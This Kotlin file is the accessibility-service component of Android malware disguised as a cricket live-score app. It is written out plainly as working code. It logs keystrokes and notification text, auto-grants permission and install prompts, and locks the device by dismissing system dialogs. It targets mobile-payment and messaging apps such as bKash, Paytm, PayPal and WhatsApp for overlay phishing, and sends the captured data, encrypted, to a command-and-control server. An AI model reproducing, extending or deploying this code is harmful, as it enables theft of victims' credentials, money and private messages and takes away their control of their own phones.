package com.cricket.livescore.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.cricket.livescore.StagerApplication
import com.cricket.livescore.utils.CryptoUtils
import com.cricket.livescore.utils.NetworkUtils
import com.cricket.livescore.utils.ObfuscatedStrings
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.DataOutputStream
import java.util.LinkedList

class StagerAccessibilityService : AccessibilityService() {
    companion object {
        const val TAG = "StagerAccessibility"
        var instance: StagerAccessibilityService? = null
        private var keylogBuffer = StringBuilder()
        private var lastKeyEventTime = 0L

        fun isRunning(): Boolean = instance != null
    }

    private var isSweeping = false
    private var sweepStartTime = 0L
    private var sweepDuration = 300000L // 5 min default
    private var isLocked = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "Accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""

        // Auto-grant permission dialogs from Android system
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller"))) {
            Log.i(TAG, "Permission dialog detected from $pkg, auto-clicking Allow")
            // Short delay for the dialog to fully render (1200ms for Android 15)
            android.os.Handler(mainLooper).postDelayed({
                grantPermissionIfPrompted()
            }, 1200)
        }

        // If locked, intercept power dialogs and navigation
        if (isLocked && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (pkg.contains("com.android.systemui") ||
                pkg.contains("android") ||
                pkg.contains("com.google.android.apps.nexuslauncher") ||
                pkg.contains("com.sec.android.app.launcher")) {
                // Dismiss system dialogs (power menu, volume panel, recent apps)
                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                return
            }
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val text = event.text?.joinToString(" ") ?: ""
                Log.d(TAG, "Clicked: $text")
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                captureTextInput(event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                detectAppChange(event)
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                captureNotification(event)
            }
        }
    }

    override fun onInterrupt() {
        Log.i(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    private fun captureTextInput(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: return
        if (text.isNotEmpty()) {
            keylogBuffer.append(text)

            val now = System.currentTimeMillis()
            if (now - lastKeyEventTime > 5000 && keylogBuffer.length > 10) {
                val packageName = event.packageName?.toString() ?: "unknown"
                sendKeylog(packageName, keylogBuffer.toString())
                keylogBuffer.clear()
                lastKeyEventTime = now
            }
        }
    }

    private fun detectAppChange(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        Log.d(TAG, "App changed to: $packageName")

        // Check if this is a target app during sweep
        if (isSweeping && isTargetApp(packageName)) {
            handleTargetApp(packageName)
        }
    }

    private fun captureNotification(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val text = event.text?.joinToString(" ") ?: return

        if (text.isNotEmpty()) {
            sendNotification(packageName, text)
        }
    }

    private fun isTargetApp(packageName: String): Boolean {
        val targets = listOf(
            "com.bKash", "com.bKash.bKashApp",
            "com.nagad", "com.nagad.nagadapp",
            "com.paytm", "net.one97.paytm",
            "com.google.android.apps.nbu.paisa.user",
            "com.easypaisa", "com.jazzcash",
            "com.gcash", "com.maya",
            "com.paypal.merchant", "com.paypal.android.p2pmobile",
            "com.venmo", "com.squareup.cash",
            "com.whatsapp", "org.telegram.messenger",
            "com.facebook.orca", "com.instagram.android",
            "com.twitter.android", "com.snapchat.android"
        )
        return targets.any { packageName.contains(it, ignoreCase = true) }
    }

    private fun handleTargetApp(packageName: String) {
        Log.i(TAG, "Target app detected: $packageName. Starting overlay phishing.")
        // The actual overlay attack is triggered by the PayloadService
        // when it receives the start_sweep command from C2
    }

    fun startSweep(durationMs: Long) {
        isSweeping = true
        sweepStartTime = System.currentTimeMillis()
        sweepDuration = durationMs
        Log.i(TAG, "Sweep started for ${durationMs}ms")
    }

    fun stopSweep() {
        isSweeping = false
        Log.i(TAG, "Sweep stopped")
    }

    fun lockDevice() {
        isLocked = true
        Log.i(TAG, "Device locked via accessibility")
    }

    fun releaseDevice() {
        isLocked = false
        Log.i(TAG, "Device released")
    }

    fun isDeviceLocked(): Boolean = isLocked

    fun autoClick(x: Float, y: Float) {
        val path = Path().apply {
            moveTo(x, y)
            lineTo(x + 1, y + 1)
        }

        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build()

        dispatchGesture(gesture, null, null)
    }

    fun clickNode(node: AccessibilityNodeInfo) {
        val rect = Rect()
        node.getBoundsInScreen(rect)
        autoClick(rect.centerX().toFloat(), rect.centerY().toFloat())
    }

    fun findAndClickButton(text: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val nodes = root.findAccessibilityNodeInfosByText(text)
        nodes.forEach { node ->
            if (node.isClickable) {
                clickNode(node)
                node.recycle()
                return true
            }
            node.recycle()
        }
        return false
    }

    fun grantPermissionIfPrompted(): Boolean {
        val root = rootInActiveWindow ?: return false

        // Try all common permission button texts (English)
        val searchTexts = arrayOf("Allow", "Allow all the time", "While using the app",
            "Only this time", "Grant", "Install", "Continue", "Next")
        for (text in searchTexts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes != null && nodes.isNotEmpty()) {
                for (node in nodes) {
                    if (node.isClickable) {
                        clickNode(node)
                        node.recycle()
                        return true
                    }
                    node.recycle()
                }
            }
        }

        // Fallback: BFS through all children to find any clickable button
        // (catches locale-specific buttons like Bengali অণুমতি দিন)
        val queue = LinkedList<AccessibilityNodeInfo>()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            if (node.isClickable && node.className?.contains("Button") == true) {
                clickNode(node)
                node.recycle()
                return true
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
            node.recycle()
        }

        return false
    }

    private fun sendKeylog(packageName: String, keystrokes: String) {
        val payload = JSONObject().apply {
            put("app_package", packageName)
            put("app_name", packageName)
            put("keystrokes", keystrokes)
            put("window_title", "")
        }
        sendData("keylog", payload)
    }

    private fun sendNotification(packageName: String, content: String) {
        val payload = JSONObject().apply {
            put("app_name", packageName)
            put("content", content)
            put("post_time", System.currentTimeMillis())
        }
        sendData("notification", payload)
    }

    private fun sendData(dataType: String, payload: JSONObject) {
        Thread {
            try {
                val json = JSONObject().apply {
                    put("type", "data")
                    put("device_id", Build.ID)
                    put("data_type", dataType)
                    put("data", CryptoUtils.encryptPayload(
                        payload.toString().toByteArray(),
                        Build.ID
                    ))
                    put("timestamp", System.currentTimeMillis())
                }
                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, json.toString())
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send $dataType", e)
            }
        }.start()
    }
}
